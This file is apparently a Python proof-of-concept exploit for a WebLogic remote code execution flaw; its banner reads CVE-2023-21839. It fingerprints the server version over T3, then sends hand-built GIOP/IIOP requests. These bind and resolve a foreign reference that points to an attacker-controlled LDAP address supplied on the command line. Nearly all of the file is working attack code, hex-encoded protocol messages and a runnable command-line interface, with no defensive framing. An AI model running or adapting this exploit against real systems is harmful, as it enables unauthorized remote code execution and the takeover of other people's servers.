# -*- encoding: utf-8 -*-
import socket
import argparse

class POC:

    def __init__(self, target, port, ldap):
        self.target = target
        self.port = port
        self.timeout = 5
        self.ldap = ldap

    def verify(self):
        vp = "743320392e322e302e300a41533a3235350a484c3a39320a4d5" \
             "33a31303030303030300a50553a74333a2f2f746573743a373030310a0a"
        print("[*] ip :",self.target)
        print("[*] port :",self.port)
        print("[*] ldap :",self.ldap)
        ver = getVer(self.target, self.port, bytes.fromhex(vp))
        wlsKey1 = None
        wlsKey2 = None
        if ver == '12':
            wlsKey1 = "00424541080103000000000c41646d696e53657276657200000000000000003349" \
                      "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" \
                      "6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000" \
                      "00000000000000{{key1}}"
            wlsKey2 = "00424541080103000000000c41646d696e53657276657200000000000000003349" \
                      "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" \
                      "6f6e74657874416e793a312e30000000000004{{key3}}000000014245412c0000001000" \
                      "00000000000000{{key1}}"
        elif ver == '14':
            wlsKey1 = "00424541080103000000000c41646" \
                      "d696e53657276657200000000000000003349444c3a7765626c" \
                      "6f6769632f636f7262612f636f732f6e616d696e672f4e616d6" \
                      "96e67436f6e74657874416e793a312e30000000000002380000" \
                      "00000000014245412e000000100000000000000000{{key1}}"
            wlsKey2 = "00424541080103000000000c41646d696e53657276657" \
                      "200000000000000003349444c3a7765626c6f6769632f636f72" \
                      "62612f636f732f6e616d696e672f4e616d696e67436f6e74657" \
                      "874416e793a312e30000000000004{{key3}}00000001424541" \
                      "2e000000100000000000000000{{key1}}"
        else:
            print("[*] ",'版本不符合影响范围')
            return

        try:
            ldap = str(hex(len(self.ldap)))[2:] + self.ldap.encode().hex()
            print("[*] version: " ,ver)

            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.settimeout(self.timeout)
            soc.connect((self.target, int(self.port)))
            str2 = "47494f50010200030000001700000002000000000000000b4e616d6553657276696365"
            soc.send(bytes.fromhex(str2))
            buf = soc.recv(1024)
            print("[*] 2 ", 'locateRequest')

            ioff = 0x60
            while True:
                if buf[ioff] != 0x00:
                    ioff = ioff + 0x01
                else:
                    break
            if ioff > 1024 * 10:
                return
            while True:
                if buf[ioff] == 0x00:
                    ioff = ioff + 0x01
                else:
                    break
            p = []
            p.append(buf[ioff])
            ioff = ioff + 0x01
            p.append(buf[ioff])
            tmport = int(p[1]) | int(p[0]) << 8
            if tmport != int(self.port):
                return
            lt = ioff - 0x60
            foff = 0x60 + lt + 0x75
            while True:
                if buf[foff] == 0x0:
                    foff = foff + 0x01
                else:
                    break

            key1 = buf[foff:foff + 8].hex()
            key2 = (b'\xff\xff\xff\xff' + buf[foff + 4:foff + 8]).hex()
            wlsKey1 = wlsKey1.replace("{{key1}}",key1)
            str3_request = "00000003030000000000000000000078"+wlsKey1+"0000000b726562696e645f616e79000000000006000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000100000006000000f4000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000d3137322e32362e3131322e310000ec5b0000006400424541080103000000000100000000000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdebc0d227000000001000000010000002c00000000000100200000000300010020000100010501000100010100000000030001010000010109050100010000000f00000020000000000000000000000000000000010000000000000000010000000000000042454103000000140000000000000000"+key2+"000000004245410000000004000a03010000000000000001000000047465737400000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a443233374439314342324630463638413a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000"+ldap
            str_size = str(hex(int(len(str3_request)/2))).replace("0x","")
            while len(str_size) != 8:
                str_size = "0"+str_size
            str3_header = "47494f5001020000"+str_size
            str3 = str3_header+str3_request
            soc.send(bytes.fromhex(str3))
            buf = soc.recv(1024)
            print("[*] 3 ", 'rebindAny')

            startoff = 0x64 + lt + 0xc0 + len(self.target) + 0xac + lt + 0x5d

            while buf[startoff] != 0x32:
                if startoff > 0x2710:
                    break
                startoff = startoff + 0x01


            if startoff > 0x2710:
                key3 = b'\x32\x38\x39\x00'.hex()
            else:
                key3 = buf[startoff : startoff+4].hex()
            wlsKey2 = wlsKey2.replace("{{key3}}",key3)
            wlsKey2 = wlsKey2.replace("{{key1}}",key1)
            str4_request = "00000004030000000000000000000078"+wlsKey2+"0000000b726562696e645f616e79000000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000"+key2+"000000004245410000000004000a030100000001000000047465737400000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a443233374439314342324630463638413a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000"+ldap
            str_size = str(hex(int(len(str4_request) / 2))).replace("0x", "")
            while len(str_size) != 8:
                str_size = "0"+str_size
            str4_header = "47494f5001020000"+str_size
            str4 = str4_header+str4_request
            soc.send(bytes.fromhex(str4))
            buf = soc.recv(1024)
            print("[*] 4 ",'rebindAny')


            str5 = "47494f50010200030000001700000005000000000000000b4e616d6553657276696365"
            soc.send(bytes.fromhex(str5))
            buf = soc.recv(1024)
            print("[*] 5 ",'locateRequest')


            str6 = "47494f50010200000000011100000006030000000000000000000078"+wlsKey1+"000000087265736f6c76650000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000"+key2+"000000004245410000000004000a030100000000000000010000000574657374000000000000000100"
            soc.send(bytes.fromhex(str6))
            buf = soc.recv(1024)
            print("[*] 6 ",'resolve')

            str7 = "47494f50010200000000011100000007030000000000000000000078"+wlsKey2+"000000087265736f6c76650000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000"+key2+"000000004245410000000004000a030100000000000000010000000574657374000000000000000100"
            soc.send(bytes.fromhex(str7))
            buf = soc.recv(1024)
            print("[*] 7 ",'resolve')

        except Exception as e:
            print("[-] ","run error: ",e)
        finally:
            if soc:
                soc.close()




def getVer(host, port, vp):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.settimeout(5)
    soc.connect((host, int(port)))
    try:
        soc.send(vp)
        buf = soc.recv(1024)
        ver = buf[5:7]
        if ver[0] == 0x00 or ver[1] == 0x00:
            return ""
        return bytes.decode(ver)
    except:
        pass
    finally:
        if soc:
            soc.close()


if __name__ == "__main__":
    banner = '''
   ___         __    ____   ___ ____  _____      ____  _  ___ _____ ___  
  / __\/\   /\/__\  |___ \ / _ \___ \|___ /     |___ \/ |( _ )___ // _ \ 
 / /   \ \ / /_\_____ __) | | | |__) | |_ \ _____ __) | |/ _ \ |_ \ (_) |
/ /___  \ V //_|_____/ __/| |_| / __/ ___) |_____/ __/| | (_) |__) \__, |
\____/   \_/\__/    |_____|\___/_____|____/     |_____|_|\___/____/  /_/ 
    '''
    print(banner)
    parser = argparse.ArgumentParser(description="Please enter parameters")
    parser.add_argument('-ip','--ip',type=str,metavar='',help='target ip')
    parser.add_argument('-p','--port',type=str,metavar='', default = '7001' , help='target port')
    parser.add_argument('-l','--ldap',type=str,metavar='',help='ldap')
    args = parser.parse_args()
    if args.ip is None or args.port is None:
        parser.usage
    POC(args.ip, args.port, args.ldap).verify()

